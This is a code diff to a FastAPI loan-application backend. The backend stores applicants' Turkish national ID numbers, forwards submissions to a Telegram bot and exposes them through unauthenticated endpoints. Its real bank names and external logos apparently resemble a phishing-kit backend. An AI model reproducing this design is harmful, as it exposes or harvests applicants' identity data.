@@ -1,13 +1,16 @@
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
-from typing import List
+from typing import List, Optional
 import json
 import urllib.request
 import urllib.parse
 import os
 from datetime import datetime
+from zoneinfo import ZoneInfo
 import uvicorn
+
+IST = ZoneInfo("Europe/Istanbul")
 
 app = FastAPI(title="Kredi Başvuru API")
 
@@ -61,60 +64,6 @@ banks_storage = [
         "color": "cyan",
         "is_active": True,
         "max_applications": 0
-    },
-    {
-        "id": 5,
-        "name": "Garanti BBVA",
-        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/94ec8109-1b2b-4200-a8b1-935ac655b2ee.svg",
-        "campaign": "Bonus kart sahiplerine özel avantajlar",
-        "color": "green",
-        "is_active": True,
-        "max_applications": 0
-    },
-    {
-        "id": 6,
-        "name": "Türkiye İş Bankası",
-        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/aa37ded8-f289-4d2d-85b2-026c5063b3d0.svg",
-        "campaign": "Maximum kart avantajı",
-        "color": "blue",
-        "is_active": True,
-        "max_applications": 0
-    },
-    {
-        "id": 7,
-        "name": "Albaraka",
-        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/8f24530b-3b5d-4c6e-b651-dd671d709d54.svg",
-        "campaign": "Katılım bankacılığı avantajı",
-        "color": "gray",
-        "is_active": True,
-        "max_applications": 0
-    },
-    {
-        "id": 8,
-        "name": "Enpara",
-        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/b071446a-6bb3-4711-813b-6387c115dc4a.svg",
-        "campaign": "Dijital bankacılık fırsatı",
-        "color": "pink",
-        "is_active": True,
-        "max_applications": 0
-    },
-    {
-        "id": 9,
-        "name": "ON",
-        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/52889dca-38c7-4a02-a12c-85e84a339610.svg",
-        "campaign": "Tamamen dijital deneyim",
-        "color": "green",
-        "is_active": True,
-        "max_applications": 0
-    },
-    {
-        "id": 10,
-        "name": "Getirfinans",
-        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/2f82b0ad-9cd6-4fc3-a79b-77d6065512f7.svg",
-        "campaign": "450.000 TL'ye varan kredi",
-        "color": "purple",
-        "is_active": True,
-        "max_applications": 0
     }
 ]
 
@@ -147,23 +96,28 @@ class BankUpdate(BaseModel):
     is_active: bool
     max_applications: int = 0
 
+class BankUpdatePartial(BaseModel):
+    name: Optional[str] = None
+    logo: Optional[str] = None
+    campaign: Optional[str] = None
+    color: Optional[str] = None
+    is_active: Optional[bool] = None
+    max_applications: Optional[int] = None
+
 @app.get("/")
 async def health_check():
     return {"status": "healthy", "message": "Kredi Başvuru API is running"}
 
 @app.get("/api/banks")
 async def get_banks():
-    global banks_storage
     return [bank for bank in banks_storage if bank.get("is_active", True)]
 
 @app.get("/api/banks/all")
 async def get_all_banks():
-    global banks_storage
     return banks_storage
 
 @app.post("/api/banks")
 async def create_bank(bank: Bank):
-    global banks_storage
     new_id = max([b["id"] for b in banks_storage], default=0) + 1
     new_bank = {
         "id": new_id,
@@ -179,24 +133,25 @@ async def create_bank(bank: Bank):
 
 @app.put("/api/banks/{bank_id}")
 async def update_bank(bank_id: int, bank: BankUpdate):
-    global banks_storage
     for i, existing_bank in enumerate(banks_storage):
         if existing_bank["id"] == bank_id:
-            banks_storage[i] = {
-                "id": bank.id,
-                "name": bank.name,
-                "logo": bank.logo,
-                "campaign": bank.campaign,
-                "color": bank.color,
-                "is_active": bank.is_active,
-                "max_applications": bank.max_applications
-            }
+            banks_storage[i] = bank.dict()
             return {"success": True, "bank": banks_storage[i]}
+    raise HTTPException(status_code=404, detail="Bank not found")
+
+@app.patch("/api/banks/{bank_id}")
+async def patch_bank(bank_id: int, bank: BankUpdatePartial):
+    for i, existing_bank in enumerate(banks_storage):
+        if existing_bank["id"] == bank_id:
+            for field, value in bank.dict(exclude_unset=True).items():
+                if value is not None:
+                    existing_bank[field] = value
+            banks_storage[i] = existing_bank
+            return {"success": True, "bank": existing_bank}
     raise HTTPException(status_code=404, detail="Bank not found")
 
 @app.delete("/api/banks/{bank_id}")
 async def delete_bank(bank_id: int):
-    global banks_storage
     for i, bank in enumerate(banks_storage):
         if bank["id"] == bank_id:
             banks_storage[i]["is_active"] = False
@@ -230,8 +185,9 @@ async def calculate_loan(request: dict):
 
 @app.post("/api/submit")
 async def submit_application(application: LoanApplication):
-    global applications_storage
-    
+    now_tr = datetime.now(IST)
+    created_iso = now_tr.isoformat()
+
     new_application = {
         "id": len(applications_storage) + 1,
         "tc_kimlik": application.tc_kimlik,
@@ -241,7 +197,7 @@ async def submit_application(application: LoanApplication):
         "amount": application.amount,
         "months": application.months,
         "status": "pending",
-        "created_at": datetime.now().isoformat()
+        "created_at": created_iso
     }
     
     applications_storage.append(new_application)
@@ -258,7 +214,7 @@ async def submit_application(application: LoanApplication):
 🏛️ Banka: {application.bank_name}
 💰 Tutar: {application.amount:,} TL
 📅 Vade: {application.months} ay
-⏰ Tarih: {datetime.now().strftime('%d.%m.%Y %H:%M')}"""
+⏰ Tarih: {now_tr.strftime('%d.%m.%Y %H:%M')} (GMT+3)"""
 
         telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
         telegram_data = {
@@ -280,7 +236,6 @@ async def submit_application(application: LoanApplication):
 
 @app.get("/api/applications")
 async def get_applications():
-    global applications_storage
     return applications_storage
 
 @app.get("/api/telegram-settings")
@@ -289,7 +244,6 @@ async def get_telegram_settings():
 
 @app.post("/api/telegram-settings")
 async def update_telegram_settings(settings: TelegramSettings):
-    global telegram_settings
     telegram_settings["bot_token"] = settings.bot_token
     telegram_settings["chat_id"] = settings.chat_id
     
@@ -297,3 +251,6 @@ async def update_telegram_settings(settings: TelegramSettings):
     os.environ['TELEGRAM_CHAT_ID'] = settings.chat_id
     
     return {"success": True, "message": "Telegram ayarları güncellendi"}
+
+if __name__ == "__main__":
+    uvicorn.run(app, host="0.0.0.0", port=8000)
